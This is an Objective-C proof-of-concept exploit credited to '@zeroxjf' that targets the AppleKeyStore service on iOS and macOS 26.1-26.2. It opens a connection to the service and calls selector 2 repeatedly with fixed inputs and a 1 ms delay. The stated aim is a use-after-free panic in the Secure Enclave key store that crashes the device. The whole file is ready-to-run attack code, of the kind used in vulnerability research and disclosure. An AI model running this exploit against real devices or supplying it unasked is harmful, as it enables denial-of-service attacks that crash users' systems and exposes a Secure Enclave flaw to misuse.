// AppleSEPKeyStore UAF Panic PoC
// Author: @zeroxjf
// Target: iOS 26.1-26.2, macOS 26.1-26.2

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <stdio.h>
#import <unistd.h>

#define AKS_SERVICE_NAME "AppleKeyStore"
#define SEP_PANIC_THRESHOLD 50
#define SEP_PANIC_SELECTOR 2

int main(int argc, char* argv[]) {
    @autoreleasepool {
        printf("========================================\n");
        printf("  AppleSEPKeyStore UAF Panic PoC\n");
        printf("  Author: @zeroxjf\n");
        printf("========================================\n\n");

        printf("Target: iOS/macOS 26.1-26.2 / AppleSEPOS-3151.40.12\n");
        printf("Method: Selector 2 resource exhaustion\n");
        printf("Panic:  SEP sks task @ 0x0006fea7\n");
        printf("Threshold: ~41 consecutive calls\n\n");

        mach_port_t master_port = MACH_PORT_NULL;
        IOMainPort(MACH_PORT_NULL, &master_port);

        io_service_t svc = IOServiceGetMatchingService(master_port, IOServiceMatching(AKS_SERVICE_NAME));
        if (svc == IO_OBJECT_NULL) {
            printf("ERROR: AppleKeyStore service not found\n");
            return 1;
        }
        printf("AppleKeyStore service found\n");

        io_connect_t conn = IO_OBJECT_NULL;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0x2022, &conn);

        if (kr != KERN_SUCCESS || conn == IO_OBJECT_NULL) {
            printf("ERROR: Failed to open connection: 0x%x\n", kr);
            IOObjectRelease(svc);
            return 1;
        }
        printf("Opened connection with type 0x2022: 0x%x\n\n", conn);

        printf("!!! WARNING: System WILL panic around call #41 !!!\n\n");
        printf("Calling selector 2 repeatedly...\n\n");

        // From SEP_PANIC_ANALYSIS.md:
        // Call selector 2 repeatedly (~41 times triggers crash)
        // Input: scalars[6] = {1, 0, 0, 0x10, 0, 0}
        // Output: 1 scalar
        // Delay: 1ms between calls

        for (int i = 0; i < SEP_PANIC_THRESHOLD; i++) {
            uint64_t scalars[6] = {1, 0, 0, 0x10, 0, 0};
            uint64_t out[1] = {0};
            uint32_t outCnt = 1;

            kr = IOConnectCallMethod(conn, SEP_PANIC_SELECTOR,
                                     scalars, 6, NULL, 0,
                                     out, &outCnt, NULL, NULL);

            printf("[%2d/%d] kr=0x%08x out=%llu", i + 1, SEP_PANIC_THRESHOLD, kr, out[0]);

            if (i >= 38) {
                printf(" <-- APPROACHING THRESHOLD!");
            }
            printf("\n");

            // 1ms delay between calls (critical for SEP timing)
            usleep(1000);
        }

        printf("\n========================================\n");
        printf("Finished - if you see this, no panic occurred\n");
        printf("Try running again or check iOS/macOS version\n");
        printf("========================================\n");

        IOServiceClose(conn);
        IOObjectRelease(svc);
    }
    return 0;
}
